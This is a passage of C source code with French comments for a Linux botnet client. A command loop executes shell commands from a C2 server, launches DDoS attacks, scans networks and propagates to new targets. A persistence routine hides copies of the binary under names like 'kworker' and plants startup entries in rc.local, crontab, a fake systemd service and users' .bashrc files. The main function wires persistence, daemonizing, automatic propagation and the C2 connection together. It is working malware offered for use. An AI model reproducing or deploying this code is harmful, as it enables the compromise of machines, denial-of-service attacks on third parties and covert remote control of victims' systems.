            if (strncmp(buffer, "PING", 4) == 0) {
                // Répondre au ping
                send(sockfd, "PONG", 4, 0);
            } else if (strncmp(buffer, "EXEC ", 5) == 0) {
                // Exécuter une commande shell
                char* result = execute_command(buffer + 5);
                if (result) {
                    send(sockfd, result, strlen(result), 0);
                    free(result);
                } else {
                    send(sockfd, "ERROR: Command execution failed", 30, 0);
                }
                send(sockfd, "COMMAND_COMPLETED", 17, 0);
            } else if (strncmp(buffer, "SCAN ", 5) == 0) {
                // Scanner un sous-réseau
                scan_network(sockfd, buffer + 5);
            } else if (strncmp(buffer, "DDOS ", 5) == 0) {
                // Format: DDOS target:port duration method
                char target[256];
                char method[32] = "mix"; // Méthode par défaut: mix
                int port, duration;
                
                // Analyser la commande avec format: target:port duration [method]
                if (strchr(buffer + 5, ' ') != NULL) {
                    char *first_space = strchr(buffer + 5, ' ');
                    char *second_space = strchr(first_space + 1, ' ');
                    
                    if (second_space != NULL) {
                        // Extraire la méthode
                        strncpy(method, second_space + 1, sizeof(method) - 1);
                        method[sizeof(method) - 1] = '\0';
                        *second_space = '\0';
                    }
                    
                    // Extraire la cible et la durée
                    sscanf(buffer + 5, "%255[^:]:%d %d", target, &port, &duration);
                    *first_space = ' '; // Restaurer l'espace
                    if (second_space != NULL) *second_space = ' ';
                } else {
                    // Format incomplet
                    sscanf(buffer + 5, "%255[^:]:%d", target, &port);
                    duration = 60; // Durée par défaut: 60 secondes
                }
                
                // Lancer l'attaque avec la méthode spécifiée
                ddos_attack(sockfd, target, port, duration, method);
            } else if (strncmp(buffer, "PROPAGATE ", 10) == 0) {
                // Propager à une cible spécifique
                propagate(sockfd, buffer + 10);
            } else if (strncmp(buffer, "PERSIST ", 8) == 0) {
                // Format: PERSIST interval
                int interval;
                sscanf(buffer + 8, "%d", &interval);
                
                // Configurer la persistance avec l'intervalle spécifié
                if (interval > 0) {
                    // Enregistrer l'intervalle de reconnexion pour une utilisation ultérieure
                    // et mettre en place des mécanismes de persistance
                    persist();
                    send(sockfd, "PERSIST_ACK", 11, 0);
                }
            } else if (strcmp(buffer, "EXIT") == 0) {
                // Fermer la connexion
                break;
            }
        }
        
        // Fermer le socket et attendre avant de se reconnecter
        close(sockfd);
        sleep(30); // Intervalle de reconnexion par défaut
    }
}

// Fonction pour se détacher du terminal et s'exécuter en arrière-plan
void daemonize() {
    pid_t pid, sid;
    
    // Fork et terminer le processus parent
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    // Créer une nouvelle session
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    
    // Changer le répertoire de travail
    if (chdir("/") < 0) exit(EXIT_FAILURE);
    
    // Fermer les descripteurs de fichiers standard
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

// Fonction pour générer un identifiant unique pour ce bot
void generate_device_id(void) {
    if (device_id[0] != 0) return; // Déjà généré
    
    // Utiliser des informations matérielles pour créer un ID unique
    FILE *fp;
    char buffer[256] = {0};
    char mac[18] = {0};
    char hostname[64] = {0};
    
    // Essayer d'obtenir l'adresse MAC
    fp = popen("cat /sys/class/net/eth0/address 2>/dev/null || cat /sys/class/net/wlan0/address 2>/dev/null || echo 00:00:00:00:00:00", "r");
    if (fp) {
        fgets(mac, sizeof(mac), fp);
        pclose(fp);
    }
    
    // Essayer d'obtenir le hostname
    gethostname(hostname, sizeof(hostname));
    
    // Combiner les informations pour créer un ID unique
    snprintf(device_id, DEVICE_ID_SIZE, "%s_%s_%ld", 
             hostname[0] ? hostname : "unknown", 
             mac[0] ? mac : "00:00:00:00:00:00", 
             (long)time(NULL));
    
    // Remplacer les caractères non-alphanumériques
    for (int i = 0; device_id[i]; i++) {
        if (!isalnum(device_id[i]) && device_id[i] != '_') {
            device_id[i] = 'x';
        }
    }
}

// Vérifier si un processus est en cours d'exécution
int is_process_running(const char *process_name) {
    char command[BUFFER_SIZE];
    snprintf(command, sizeof(command), "ps aux | grep -v grep | grep -q '%s'", process_name);
    return system(command) == 0;
}

// Fonction pour la persistance avancée
void persist(void) {
    char command[BUFFER_SIZE*4];
    char path[BUFFER_SIZE];
    char *hide_names[] = {
        "sysupdate",
        "systemd-worker",
        "kworker",
        "crond",
        "udevd"
    };
    
    // Sélectionner un nom aléatoire pour se cacher
    char *hide_name = hide_names[time(NULL) % (sizeof(hide_names)/sizeof(hide_names[0]))];
    
    // Obtenir le chemin de l'exécutable actuel
    if (readlink("/proc/self/exe", path, BUFFER_SIZE) == -1) {
        // Fallback si readlink échoue
        strcpy(path, "/bin/sh"); // Valeur par défaut sécurisée
    }
    
    // Générer l'ID unique du dispositif
    generate_device_id();
    
    // 1. Copier dans plusieurs emplacements avec des noms différents
    char *system_dirs[] = {
        "/bin", "/usr/bin", "/usr/local/bin", "/tmp", "/var/tmp", "/dev", "/etc"
    };
    
    for (int i = 0; i < sizeof(system_dirs)/sizeof(system_dirs[0]); i++) {
        snprintf(command, sizeof(command), "cp %s %s/.%s 2>/dev/null && chmod +x %s/.%s", 
                 path, system_dirs[i], hide_name, system_dirs[i], hide_name);
        system(command);
    }
    
    // 2. Ajouter à plusieurs fichiers d'initialisation
    char *init_files[] = {
        "/etc/rc.local",
        "/etc/rc.d/rc.local",
        "/etc/init.d/rcS",
        "/etc/init.d/boot"
    };
    
    for (int i = 0; i < sizeof(init_files)/sizeof(init_files[0]); i++) {
        FILE *rc = fopen(init_files[i], "a");
        if (rc) { 
            fprintf(rc, "/bin/.%s & # %s\n", hide_name, device_id); 
            fclose(rc); 
        }
    }
    
    // 3. Ajouter à la crontab avec plusieurs entrées
    system("(crontab -l 2>/dev/null | grep -v sysupdate; echo '@reboot /bin/.sysupdate') | crontab - 2>/dev/null");
    system("(crontab -l 2>/dev/null | grep -v kworker; echo '*/30 * * * * /usr/bin/.kworker') | crontab - 2>/dev/null");
    
    // 4. Créer un service systemd
    FILE *fp = fopen("/etc/systemd/system/system-worker.service", "w");
    if (fp) {
        fprintf(fp, "[Unit]\nDescription=System Worker Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/.%s\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n", hide_name);
        fclose(fp);
        system("systemctl enable system-worker.service 2>/dev/null");
    }
    
    // 5. Créer un fichier .bashrc caché pour infecter les utilisateurs qui se connectent
    char *user_dirs[] = {
        "/root", "/home/admin", "/home/user", "/home/pi"
    };
    
    for (int i = 0; i < sizeof(user_dirs)/sizeof(user_dirs[0]); i++) {
        char bashrc_path[BUFFER_SIZE];
        snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", user_dirs[i]);
        FILE *bashrc = fopen(bashrc_path, "a");
        if (bashrc) {
            fprintf(bashrc, "\n# System update\n(/bin/.%s &) > /dev/null 2>&1\n", hide_name);
            fclose(bashrc);
        }
    }
    
    // 6. Vérifier si les processus sont déjà en cours d'exécution
    int running = 0;
    for (int i = 0; i < sizeof(hide_names)/sizeof(hide_names[0]); i++) {
        char process_name[BUFFER_SIZE];
        snprintf(process_name, sizeof(process_name), ".%s", hide_names[i]);
        if (is_process_running(process_name)) {
            running = 1;
            break;
        }
    }
    
    // 7. Lancer les processus s'ils ne sont pas déjà en cours d'exécution
    if (!running) {
        for (int i = 0; i < sizeof(system_dirs)/sizeof(system_dirs[0]); i++) {
            snprintf(command, sizeof(command), "%s/.%s & > /dev/null 2>&1", system_dirs[i], hide_name);
            system(command);
        }
    }
}

int main(int argc, char *argv[]) {
    signal(SIGPIPE, SIG_IGN);
    if (argc > 1) {
        // Spécifique à l'archi si besoin
    }
    persist();
    daemonize();
    // Lancer la propagation automatique en tâche de fond
    if (fork() == 0) {
        while (1) {
            auto_propagate();
            sleep(600); // Toutes les 10 minutes
        }
        exit(0);
    }
    connect_to_c2();
    return 0;
}